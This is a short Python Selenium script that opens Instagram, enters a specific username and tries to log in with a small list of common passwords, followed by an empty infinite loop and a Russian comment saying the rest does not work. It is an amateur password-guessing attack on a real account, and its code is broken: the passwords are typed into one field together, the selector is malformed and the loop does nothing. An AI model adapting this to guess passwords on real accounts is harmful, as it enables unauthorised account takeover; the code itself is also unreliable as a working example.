from selenium import webdriver
from selenium.webdriver.common.by import By
driver = webdriver.Firefox(executable_path="E:\geckodriver.exe")

driver.get("https://www.instagram.com/")

textarea = driver.find_element(By.CLASS_NAME, value="_2hvTZ pexuQ zyHYP").send_keys("abdulla___blog")

passwords = ("password","123456","12345678")

for i in range (len(passwords)):
    textarea2 = driver.find_element(By.CLASS_NAME, value="_2hvTZ pexuQ zyHYP").send_keys(passwords[i])

driver.find_element(By.CLASS_NAME, value = "submit").click()
wait = driver.implicitly_wait(5)

while True:
    for i in range(len(passwords)):
        pass
    pass





# отсюда ничего не работает, переписать
# wait4 = driver.implicitly_wait(5)
# driver.find_element(By.ID, value = "x-auto-37").click()
# driver.find_element(By.ID, value = "btnStartLesson").click()
